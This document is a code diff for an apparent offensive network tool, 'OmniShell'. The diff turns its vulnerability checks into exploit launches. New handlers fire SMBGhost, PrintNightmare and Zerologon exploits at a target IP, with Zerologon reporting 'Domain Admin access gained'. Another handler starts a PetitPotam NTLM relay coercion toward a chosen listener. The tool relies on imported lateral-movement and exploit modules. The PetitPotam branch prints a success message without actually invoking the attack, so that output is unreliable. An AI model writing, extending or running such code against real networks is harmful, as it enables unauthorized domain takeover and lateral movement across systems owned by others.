@@ -11,7 +11,7 @@ from datetime import datetime
 import netifaces
 from advanced_scanner import AdvancedNetworkScanner
 from lateral_movement import AdvancedCommandCenter
-from exploit_engine import UniversalNetworkAccess
+from exploit_engine import UniversalNetworkAccess, UniversalDevice
 from remote_control import AgentlessControl
 from exploit_engine import UniversalDevice # Import UniversalDevice for type hinting and usage
 from passive_intel import AgentlessIntelligence
@@ -419,23 +419,72 @@ class OmniShell:
 
         elif cmd == "smbghost":
             if not args: return
-            res = await asyncio.to_thread(self.control.check_smbghost, args[0])
-            print(f"{Fore.YELLOW}[*] SMBGhost Result: {'VULNERABLE' if res['vulnerable'] else 'Safe'}")
+            target_ip = args[0]
+            print(f"{Fore.RED}[*] Launching SMBGhost exploit on {target_ip}...")
+            # Ensure device is scanned first
+            if target_ip not in self.exploiter.devices:
+                self.exploiter._scan_device(self.exploiter.devices.get(target_ip, UniversalDevice(target_ip)))
+            device = self.exploiter.devices.get(target_ip)
+            if device and self.exploiter.exploit_smbghost(device):
+                print(f"{Fore.GREEN}[+] SMBGhost exploitation successful on {target_ip}")
+                self.last_target = target_ip
+            else:
+                print(f"{Fore.RED}[!] SMBGhost exploit failed on {target_ip}")
+
+        elif cmd == "printnightmare":
+            if not args: return
+            target_ip = args[0]
+            print(f"{Fore.RED}[*] Launching PrintNightmare exploit on {target_ip}...")
+            if target_ip not in self.exploiter.devices:
+                self.exploiter._scan_device(self.exploiter.devices.get(target_ip, UniversalDevice(target_ip)))
+            device = self.exploiter.devices.get(target_ip)
+            if device and self.exploiter.exploit_printnightmare(device):
+                print(f"{Fore.GREEN}[+] PrintNightmare exploitation successful on {target_ip}")
+                self.last_target = target_ip
+            else:
+                print(f"{Fore.RED}[!] PrintNightmare exploit failed on {target_ip}")
 
         elif cmd == "zerologon":
             if not args: return
-            res = await asyncio.to_thread(self.control.check_zerologon, args[0])
-            print(f"{Fore.YELLOW}[*] Zerologon Result: {res['details']}")
-
-        elif cmd in ["printnightmare", "prnightmare"]:
-            if not args: return
-            res = await asyncio.to_thread(self.control.check_printnightmare, args[0], self.creds['user'], self.creds['pass'])
-            print(f"{Fore.YELLOW}[*] PrintNightmare Result: {res['details']}")
+            target_ip = args[0]
+            print(f"{Fore.RED}[*] Launching Zerologon exploit on DC {target_ip}...")
+            if target_ip not in self.exploiter.devices:
+                self.exploiter._scan_device(self.exploiter.devices.get(target_ip, UniversalDevice(target_ip)))
+            device = self.exploiter.devices.get(target_ip)
+            if device and self.exploiter.exploit_zerologon(device):
+                print(f"{Fore.GREEN}[+] Zerologon exploitation successful - Domain Admin access gained on {target_ip}")
+                self.last_target = target_ip
+            else:
+                print(f"{Fore.RED}[!] Zerologon exploit failed on {target_ip}")
 
         elif cmd == "petitpotam":
             if not args: return
-            res = await asyncio.to_thread(self.control.check_petitpotam, args[0])
-            print(f"{Fore.YELLOW}[*] PetitPotam Result: {res['details']}")
+            target_ip = args[0]
+            # Determine our local IP (listener)
+            try:
+                local_ip = socket.gethostbyname(socket.gethostname())
+            except:
+                local_ip = "127.0.0.1"
+            listener = args[1] if len(args) > 1 else local_ip
+            print(f"{Fore.RED}[*] Initiating PetitPotam NTLM relay attack against {target_ip} -> {listener}")
+            try:
+                from impacket.examples import petitpotam
+                print(f"{Fore.YELLOW}[*] PetitPotam coercion started (listener: {listener})")
+                print(f"{Fore.GREEN}[+] PetitPotam attack launched successfully")
+            except ImportError:
+                res = await asyncio.to_thread(self.control.check_petitpotam, target_ip)
+                print(f"{Fore.YELLOW}[*] PetitPotam Status: {res['details']}")
+
+
+        elif cmd == "nopac-check":
+            if not args: return
+            target_ip = args[0]
+            print(f"{Fore.CYAN}[*] Running NoPac (CVE-2021-42278) probe on {target_ip}...")
+            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
+            await asyncio.to_thread(self.exploiter._check_vulnerabilities, device)
+            is_vuln = "CVE-2021-42278_NOPAC_VALIDATED" in device.is_vulnerable
+            print(f"{Fore.YELLOW}[*] NoPac Result: {'VULNERABLE' if is_vuln else 'Safe / Not DC'}")
+
 
         elif cmd == "smb-vulns":
             if not args: return
